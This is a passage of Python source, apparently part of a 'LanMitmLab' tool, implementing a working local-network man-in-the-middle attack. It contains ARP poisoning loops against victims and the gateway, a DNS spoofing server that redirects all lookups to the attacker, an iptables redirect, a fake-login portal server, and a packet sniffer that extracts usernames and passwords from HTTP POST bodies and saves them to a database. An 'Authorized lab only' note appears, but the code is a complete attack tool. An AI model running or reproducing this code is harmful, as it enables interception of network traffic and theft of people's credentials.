            self._say("[!] Raw socket permission denied (need root)")
            return
        except Exception as exc:
            self._say("[!] Raw socket error: {e}".format(e=exc))
            return

        self._say("[*] Python Intelligent & Self-Healing ARP spoof loop on {i}".format(i=iface))
        iteration_count = 0

        while not self._stop.is_set():
            try:
                sent_this_round = 0
                for tip, tmac in targets:
                    if not tmac:
                        continue
                    # to victim: gateway_ip is me
                    pkt1 = self._build_arp_packet(
                        attacker_mac, gateway_ip, tmac, tip, op=2
                    )
                    sock.send(pkt1)
                    sent_this_round += 1

                    # to gateway: victim_ip is me
                    pkt2 = self._build_arp_packet(
                        attacker_mac, tip, gateway_mac, gateway_ip, op=2
                    )
                    sock.send(pkt2)
                    sent_this_round += 1

                with self._lock:
                    self._spoof_packets_sent += sent_this_round

                # Adaptive Sleep to prevent network congestion or slow targeting
                # Sleep interval adapts to the size of the target list
                sleep_time = max(0.5, min(2.0, 2.0 / max(1, len(targets))))
                time.sleep(sleep_time)

                # Self-Healing Check: Every 15 rounds, verify target MAC addresses
                iteration_count += 1
                if iteration_count % 15 == 0:
                    updated_targets = []
                    for tip, tmac in targets:
                        fresh_mac = self.get_mac(tip)
                        if fresh_mac and fresh_mac != tmac:
                            self._say("[*] Self-Healing: Target {0} MAC updated from {1} to {2}".format(tip, tmac, fresh_mac))
                            updated_targets.append((tip, fresh_mac))
                        elif fresh_mac:
                            updated_targets.append((tip, tmac))
                        else:
                            # If offline, keep the last known MAC and continue
                            updated_targets.append((tip, tmac))
                    targets = updated_targets

            except Exception as exc:
                self._say("[!] ARP loop error: {e}".format(e=exc))
                time.sleep(1.0)
        try:
            sock.close()
        except Exception:
            pass

    def _start_arpspoof_procs(
        self,
        iface: str,
        gateway_ip: str,
        targets: List[str],
    ) -> bool:
        path = which("arpspoof")
        if not path:
            return False
        # arpspoof -i iface -t target gateway
        # arpspoof -i iface -t gateway target
        for t in targets:
            for cmd in (
                [path, "-i", iface, "-t", t, gateway_ip],
                [path, "-i", iface, "-t", gateway_ip, t],
            ):
                try:
                    proc = subprocess.Popen(
                        cmd,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        text=True,
                    )
                    self._procs.append(proc)
                    self._say("[*] started: {c}".format(c=" ".join(cmd)))
                except Exception as exc:
                    self._say("[!] arpspoof failed: {e}".format(e=exc))
                    return False
        return True

    def _restore_arp(
        self,
        iface: str,
        gateway_ip: str,
        gateway_mac: str,
        targets: List[Tuple[str, str]],
        attacker_mac: str,
    ) -> None:
        """Send a few honest ARP replies (best effort)."""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
            sock.bind((iface, 0))
        except Exception:
            self._say("[*] ARP restore skipped (no raw socket)")
            return
        try:
            for _ in range(3):
                for tip, tmac in targets:
                    if not tmac or not gateway_mac:
                        continue
                    # tell victim real gateway
                    pkt1 = self._build_arp_packet(
                        gateway_mac, gateway_ip, tmac, tip, op=2
                    )
                    sock.send(pkt1)
                    # tell gateway real victim
                    pkt2 = self._build_arp_packet(
                        tmac, tip, gateway_mac, gateway_ip, op=2
                    )
                    sock.send(pkt2)
                time.sleep(0.3)
        finally:
            try:
                sock.close()
            except Exception:
                pass
        self._say("[*] ARP restore packets sent (best effort)")

    # ── DNS backends ──────────────────────────────────────

    def _dns_name_decode(self, data: bytes, offset: int) -> Tuple[str, int]:
        labels = []
        jumped = False
        orig = offset
        for _ in range(64):
            if offset >= len(data):
                break
            length = data[offset]
            if length == 0:
                offset += 1
                break
            if (length & 0xC0) == 0xC0:
                if offset + 1 >= len(data):
                    break
                ptr = ((length & 0x3F) << 8) | data[offset + 1]
                if not jumped:
                    orig = offset + 2
                offset = ptr
                jumped = True
                continue
            offset += 1
            labels.append(data[offset:offset + length].decode("utf-8", "ignore"))
            offset += length
        name = ".".join(labels).lower().rstrip(".")
        return name, (orig if jumped else offset)

    def _dns_encode_name(self, name: str) -> bytes:
        out = b""
        for label in name.split("."):
            if not label:
                continue
            b = label.encode("utf-8")
            out += bytes([len(b)]) + b
        return out + b"\x00"

    def _dns_build_response(
        self,
        query: bytes,
        qname: str,
        answer_ip: str,
    ) -> bytes:
        if len(query) < 12:
            return b""
        tid = query[:2]
        flags = b"\x81\x80"  # standard response, recursion available
        counts = struct.pack("!HHHH", 1, 1, 0, 0)
        # question copy from original after header
        # rebuild question
        q = self._dns_encode_name(qname) + b"\x00\x01\x00\x01"
        # answer
        ans = (
            b"\xc0\x0c"
            + b"\x00\x01\x00\x01"
            + struct.pack("!I", 30)
            + struct.pack("!H", 4)
            + self._ip_bytes(answer_ip)
        )
        return tid + flags + counts + q + ans

    def _python_dns_loop(self, bind_ip: str, mapping: Dict[str, str], catch_all: str, upstream: str = "8.8.8.8") -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((bind_ip, 53))
        except Exception as exc:
            self._say("[!] DNS bind failed on {ip}:53 — {e}".format(ip=bind_ip, e=exc))
            self._say("[!] Try: stop systemd-resolved / use root / pick another IP")
            try:
                sock.close()
            except Exception:
                pass
            return
        sock.settimeout(1.0)
        self._say("[*] Python DNS spoof listening on {ip}:53 (upstream: {up})".format(ip=bind_ip, up=upstream))
        mapping_l = {k.lower().rstrip("."): v for k, v in mapping.items()}
        while not self._stop.is_set():
            try:
                data, addr = sock.recvfrom(512)
            except socket.timeout:
                continue
            except Exception:
                break
            try:
                if len(data) < 12:
                    continue
                qname, _ = self._dns_name_decode(data, 12)
                if not qname:
                    continue
                # check if spoofed
                answer = mapping_l.get(qname)
                if not answer:
                    # suffix match
                    for dom, ip in mapping_l.items():
                        if qname == dom or qname.endswith("." + dom):
                            answer = ip
                            break
                if not answer and catch_all:
                    answer = catch_all

                if answer and is_valid_ipv4(answer):
                    # Spoof it!
                    resp = self._dns_build_response(data, qname, answer)
                    if resp:
                        sock.sendto(resp, addr)
                        self._say(
                            "[dns-spoof] {q} -> {ip} (for {a})".format(
                                q=qname, ip=answer, a=addr[0]
                            )
                        )
                else:
                    # Not spoofed -> Forward to upstream DNS server!
                    if upstream and is_valid_ipv4(upstream):
                        try:
                            # Forward exact query to upstream
                            fwd_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            fwd_sock.settimeout(2.0)
                            fwd_sock.sendto(data, (upstream, 53))
                            resp_data, _ = fwd_sock.recvfrom(1024)
                            sock.sendto(resp_data, addr)
                            self._say("[dns-forward] {q} forwarded to {up} (for {a})".format(
                                q=qname, up=upstream, a=addr[0]
                            ))
                        except Exception as fwd_exc:
                            self._say("[!] DNS forward error for {q} to {up}: {e}".format(
                                q=qname, up=upstream, e=fwd_exc
                            ))
                        finally:
                            try:
                                fwd_sock.close()
                            except Exception:
                                pass
            except Exception as exc:
                self._say("[!] DNS handler error: {e}".format(e=exc))
        try:
            sock.close()
        except Exception:
            pass

    def _python_sniff_loop(self, iface: str, targets: List[str]) -> None:
        """
        Pure-Python Raw Socket Sniffer for HTTP POST Credentials and DNS Requests.
        Only sniffs if running on Linux with raw socket permissions.
        """
        try:
            # ETH_P_ALL is 0x0003
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
            sock.bind((iface, 0))
            sock.settimeout(1.0)
        except PermissionError:
            self._say("[!] Sniffer raw socket permission denied (need root)")
            return
        except Exception as exc:
            self._say("[!] Sniffer raw socket bind error: {e}".format(e=exc))
            return

        self._say("[*] Live Sniffer started on {i} (monitoring targets: {t})".format(
            i=iface, t=", ".join(targets)
        ))

        targets_set = set(targets)

        while not self._stop.is_set():
            try:
                packet, _ = sock.recvfrom(65535)
            except socket.timeout:
                continue
            except Exception:
                break

            if len(packet) < 34:  # Minimum size for Eth (14) + IP (20)
                continue

            # Ethernet Header: Dest MAC (6), Src MAC (6), EtherType (2)
            eth_type = struct.unpack("!H", packet[12:14])[0]
            if eth_type != 0x0800:  # IPv4 only
                continue

            # IP Header starts at byte 14
            ip_header = packet[14:34]
            iph = struct.unpack("!BBHHHBBH4s4s", ip_header)

            version_ihl = iph[0]
            ihl = (version_ihl & 0x0F) * 4
            protocol = iph[6]

            src_ip = socket.inet_ntoa(iph[8])
            dst_ip = socket.inet_ntoa(iph[9])

            # Check if source or destination is in our targets of interest
            if src_ip not in targets_set and dst_ip not in targets_set:
                continue

            # IP Payload starts at 14 + ihl
            ip_payload_idx = 14 + ihl
            if len(packet) < ip_payload_idx:
                continue

            # Protocol: 6 = TCP, 17 = UDP
            if protocol == 6:  # TCP
                if len(packet) < ip_payload_idx + 20:  # Minimum TCP header size is 20 bytes
                    continue
                # TCP Header starts at ip_payload_idx
                # We unpack 20 bytes (9 fields: Source Port, Dest Port, Seq, Ack, Offset/Flags, Window, Checksum, Urgent)
                tcph = struct.unpack("!HHIIBBHHH", packet[ip_payload_idx : ip_payload_idx + 20])
                src_port = tcph[0]
                dst_port = tcph[1]
                data_offset = (tcph[4] >> 4) * 4

                tcp_payload_idx = ip_payload_idx + data_offset
                if len(packet) <= tcp_payload_idx:
                    continue

                payload = packet[tcp_payload_idx:]

                # Check for HTTP traffic (port 80)
                if src_port == 80 or dst_port == 80:
                    try:
                        text = payload.decode("utf-8", errors="ignore")
                    except Exception:
                        continue

                    if not text:
                        continue

                    # Parse HTTP Request
                    if "GET " in text or "POST " in text or "HTTP/1." in text:
                        # Extract HTTP Host
                        host = "unknown"
                        m_host = re.search(r"(?i)Host:\s*([^\r\n]+)", text)
                        if m_host:
                            host = m_host.group(1).strip()

                        # Show HTTP Request
                        m_req = re.match(r"^([A-Z]+)\s+([^\s?]+)", text)
                        if m_req:
                            method, path = m_req.group(1), m_req.group(2)
                            self._say("[http] {src} -> {host}{path} ({method})".format(
                                src=src_ip, host=host, path=path, method=method
                            ))

                        # If POST, look for logins / passwords
                        if "POST " in text:
                            # Split headers and body
                            parts = text.split("\r\n\r\n", 1)
                            body = parts[1] if len(parts) > 1 else ""
                            if body:
                                extracted_user = None
                                extracted_pass = None

                                # Search url-encoded body
                                m_user = re.search(r"(?i)(?:user|username|email|login|usr|uname)=(?P<user>[^&]+)", body)
                                if m_user:
                                    import urllib.parse
                                    extracted_user = urllib.parse.unquote(m_user.group("user").strip())
                                m_pass = re.search(r"(?i)(?:password|pass|pwd|passwd|psw)=(?P<pass>[^&]+)", body)
                                if m_pass:
                                    import urllib.parse
                                    extracted_pass = urllib.parse.unquote(m_pass.group("pass").strip())

                                # Also check JSON if body is JSON
                                if "{" in body and "}" in body:
                                    m_juser = re.search(r'"(?:user|username|email|login)":\s*"(?P<user>[^"]+)"', body)
                                    if m_juser:
                                        extracted_user = m_juser.group("user").strip()
                                    m_jpass = re.search(r'"(?:password|pass|pwd|passwd)":\s*"(?P<pass>[^"]+)"', body)
                                    if m_jpass:
                                        extracted_pass = m_jpass.group("pass").strip()

                                if extracted_user or extracted_pass:
                                    cred_msg = "Captured Login from {src} to {host}: User={u} Pass={p}".format(
                                        src=src_ip, host=host, u=extracted_user or "-", p=extracted_pass or "-"
                                    )
                                    self._say("[!] [ok] CREDENTIAL CAPTURED: {msg}".format(msg=cred_msg))
                                    # Save to memory list in LanMitmLab for UI retrieval
                                    with self._lock:
                                        self._captured_creds.append({
                                            "src": src_ip,
                                            "host": host,
                                            "user": extracted_user or "",
                                            "pass": extracted_pass or "",
                                            "time": time.time()
                                        })
                                    # Save to database
                                    if self.db:
                                        try:
                                            self.db.add_credential(
                                                bssid=src_ip,
                                                essid=host,
                                                pin=None,
                                                psk="User: {u} | Pass: {p}".format(u=extracted_user or "-", p=extracted_pass or "-"),
                                                method="LAN_MITM_Sniffer"
                                            )
                                            self.db.log(
                                                "capture",
                                                "lan_mitm",
                                                "Credential captured from {src} for {host}".format(src=src_ip, host=host),
                                                "ok"
                                            )
                                        except Exception as db_exc:
                                            self._say("[!] Failed to save credential to DB: {e}".format(e=db_exc))

            elif protocol == 17:  # UDP
                if len(packet) < ip_payload_idx + 8:
                    continue
                # UDP Header
                udph = struct.unpack("!HHHH", packet[ip_payload_idx : ip_payload_idx + 8])
                src_port = udph[0]
                dst_port = udph[1]

                udp_payload_idx = ip_payload_idx + 8
                payload = packet[udp_payload_idx:]

                # Check for DNS Query (port 53)
                if dst_port == 53 and len(payload) >= 12:
                    try:
                        qname, _ = self._dns_name_decode(payload, 12)
                        if qname:
                            self._say("[dns-query] {src} requested {q}".format(src=src_ip, q=qname))
                    except Exception:
                        pass
        try:
            sock.close()
        except Exception:
            pass

    # ── Start / Stop ──────────────────────────────────────

    def start(
        self,
        iface: str,
        gateway_ip: str,
        targets: List[str],
        dns_map: Optional[Dict[str, str]] = None,
        dns_catch_all: str = "",
        enable_dns: bool = False,
        dns_upstream: str = "8.8.8.8",
        enable_portal: bool = False,
        portal_template: str = "socialnet",
    ) -> Tuple[bool, str]:
        with self._lock:
            if self.session.running:
                return False, "Session already running — stop it first"

            self.generate_ca_certificate()

            iface = (iface or "").strip()
            gateway_ip = (gateway_ip or "").strip()
            targets = [t.strip() for t in targets if t and t.strip()]
            if not iface:
                return False, "Interface required"
            if not is_private_ipv4(gateway_ip):
                return False, "Gateway must be a private IPv4 address"
            if not targets:
                return False, "At least one target IP required"
            for t in targets:
                if not is_private_ipv4(t):
                    return False, "Target not private IPv4: {t}".format(t=t)
                if t == gateway_ip:
                    return False, "Target cannot be the gateway itself"

            attacker_ip = self.get_local_ip(iface)
            attacker_mac = self.get_iface_mac(iface)
            if not attacker_mac:
                return False, "Cannot read MAC for {i}".format(i=iface)

            # If portal is enabled, we MUST force DNS spoofing of all domains to our own IP
            if enable_portal:
                enable_dns = True
                dns_catch_all = attacker_ip

            self._say("[*] Resolving MACs...")
            gateway_mac = self.get_mac(gateway_ip)
            if not gateway_mac:
                return False, "Cannot resolve gateway MAC for {g}".format(g=gateway_ip)

            target_pairs: List[Tuple[str, str]] = []
            for t in targets:
                mac = self.get_mac(t)
                if not mac:
                    self._say("[!] No MAC for {t} — ping and retry?".format(t=t))
                else:
                    target_pairs.append((t, mac))
            if not target_pairs:
                return False, "No target MACs resolved — hosts offline?"

            # IP forward
            self._orig_forward = self._read_forward()
            if not self.set_ip_forward(True):
                return False, "Failed to enable ip_forward (need root)"

            self._stop.clear()
            self._procs = []
            self._threads = []
            self._captured_creds = []

            # ARP backend selection
            arp_backend = "python-raw"
            if which("arpspoof") and self._start_arpspoof_procs(
                iface, gateway_ip, [t for t, _ in target_pairs]
            ):
                arp_backend = "arpspoof"
            else:
                th = threading.Thread(
                    target=self._python_arp_loop,
                    args=(
                        iface,
                        attacker_mac,
                        gateway_ip,
                        gateway_mac,
                        target_pairs,
                    ),
                    name="arp-spoof",
                    daemon=True,
                )
                th.start()
                self._threads.append(th)
                arp_backend = "python-raw"

            dns_backend = ""
            dns_map = dict(dns_map or {})
            if enable_dns:
                th = threading.Thread(
                    target=self._python_dns_loop,
                    args=(attacker_ip, dns_map, dns_catch_all.strip(), dns_upstream),
                    name="dns-spoof",
                    daemon=True,
                )
                th.start()
                self._threads.append(th)
                dns_backend = "python-udp"
                if which("iptables"):
                    ok, out = _run_ok(
                        [
                            "iptables", "-t", "nat", "-A", "PREROUTING",
                            "-i", iface, "-p", "udp", "--dport", "53",
                            "-j", "REDIRECT", "--to-ports", "53",
                        ],
                        timeout=5,
                    )
                    if ok:
                        self._say("[*] iptables UDP/53 REDIRECT enabled")
                        dns_backend += "+iptables-redir"
                    else:
                        self._say("[!] iptables redirect failed: {e}".format(e=out))

            # Start Portal HTTP Server if requested
            self._http_server = None
            if enable_portal:
                try:
                    server = HTTPServer(("0.0.0.0", 80), MitmHTTPHandler)
                    server.lab = self
                    server.template = portal_template
                    server.attacker_ip = attacker_ip
                    self._http_server = server

                    th = threading.Thread(
                        target=server.serve_forever,
                        name="portal-server",
                        daemon=True,
                    )
                    th.start()
                    self._threads.append(th)
                    self._say("[*] Portal HTTP server started on port 80 (template: {0})".format(portal_template))
                except PermissionError:
                    self._say("[!] Cannot bind port 80: Permission Denied. Trying fallback port 8080...")
                    try:
                        server = HTTPServer(("0.0.0.0", 8080), MitmHTTPHandler)
                        server.lab = self
                        server.template = portal_template
                        server.attacker_ip = attacker_ip
                        self._http_server = server

                        th = threading.Thread(
                            target=server.serve_forever,
                            name="portal-server",
                            daemon=True,
                        )
                        th.start()
                        self._threads.append(th)
                        self._say("[*] Portal HTTP server started on fallback port 8080")
                    except Exception as http_exc:
                        self._say("[!] Fallback HTTP server failed: {e}".format(e=http_exc))
                except Exception as http_exc:
                    self._say("[!] HTTP server failed to start: {e}".format(e=http_exc))

            # Start Live Traffic Sniffer thread
            sniff_th = threading.Thread(
                target=self._python_sniff_loop,
                args=(iface, [t for t, _ in target_pairs]),
                name="traffic-sniffer",
                daemon=True,
            )
            sniff_th.start()
            self._threads.append(sniff_th)

            self.session = MitmSession(
                iface=iface,
                gateway_ip=gateway_ip,
                gateway_mac=gateway_mac,
                targets=[t for t, _ in target_pairs],
                attacker_ip=attacker_ip,
                attacker_mac=attacker_mac,
                dns_enabled=bool(enable_dns),
                dns_map=dns_map,
                dns_catch_all=dns_catch_all.strip(),
                dns_upstream=dns_upstream,
                portal_enabled=bool(enable_portal),
                portal_template=portal_template,
                arp_backend=arp_backend,
                dns_backend=dns_backend,
                started_at=time.time(),
                running=True,
                notes=[
                    "Authorized lab only",
                    "Stop session to restore ARP/ip_forward",
                ],
            )
            self._say(
                "[+] MITM started backend={a} dns={d} targets={n} portal={p}".format(
                    a=arp_backend, d=dns_backend or "off", n=len(target_pairs), p=portal_template if enable_portal else "off"
                )
            )
            return True, "MITM session running"

    def stop(self) -> Tuple[bool, str]:
        with self._lock:
            if not self.session.running and not self._procs and not self._threads:
                return True, "Nothing to stop"

            self._say("[*] Stopping MITM session...")
            self._stop.set()

            # stop portal HTTP server if running
            if hasattr(self, "_http_server") and self._http_server:
                try:
                    self._http_server.shutdown()
                    self._http_server.server_close()
                    self._say("[*] Portal HTTP server stopped")
                except Exception:
                    pass
                self._http_server = None

            # kill external procs
            for proc in list(self._procs):
                try:
                    proc.terminate()
                except Exception:
                    pass
            time.sleep(0.4)
            for proc in list(self._procs):
                try:
                    if proc.poll() is None:
                        proc.kill()
                except Exception:
                    pass
            self._procs = []

            # join threads briefly
            for th in list(self._threads):
                try:
                    th.join(timeout=2.0)
                except Exception:
                    pass
            self._threads = []

            # iptables cleanup (best effort remove our redirect rule)
            if which("iptables") and self.session.iface:
                _run_ok(
                    [
                        "iptables", "-t", "nat", "-D", "PREROUTING",
                        "-i", self.session.iface, "-p", "udp", "--dport", "53",
                        "-j", "REDIRECT", "--to-ports", "53",
                    ],
                    timeout=5,
                )

            # ARP restore
            pairs = []
            for t in self.session.targets:
                mac = self.get_mac(t) or ""
                pairs.append((t, mac))
            if self.session.iface and self.session.gateway_mac:
                self._restore_arp(
                    self.session.iface,
                    self.session.gateway_ip,
                    self.session.gateway_mac,
                    pairs,
                    self.session.attacker_mac,
                )

            # restore ip_forward
            if self._orig_forward is not None:
                self.set_ip_forward(self._orig_forward == "1")
            else:
                self.set_ip_forward(False)

            self.session.running = False
            self._say("[+] MITM stopped / cleanup done")
            return True, "Stopped"

    def status(self) -> Dict:
        s = self.session
        up = 0.0
        if s.running and s.started_at:
            up = time.time() - s.started_at
        alive_procs = 0
        for p in self._procs:
            try:
                if p.poll() is None:
                    alive_procs += 1
            except Exception:
                pass
        return {
            "running": s.running,
            "iface": s.iface,
            "gateway_ip": s.gateway_ip,
            "gateway_mac": s.gateway_mac,
            "targets": list(s.targets),
            "attacker_ip": s.attacker_ip,
            "attacker_mac": s.attacker_mac,
            "dns_enabled": s.dns_enabled,
            "dns_map": dict(s.dns_map),
            "dns_catch_all": s.dns_catch_all,
            "dns_upstream": s.dns_upstream,
            "portal_enabled": s.portal_enabled,
            "portal_template": s.portal_template,
            "arp_backend": s.arp_backend,
            "dns_backend": s.dns_backend,
            "uptime_sec": int(up),
            "alive_procs": alive_procs,
            "tools": detect_tools(),
            "ip_forward": self._read_forward(),
        }
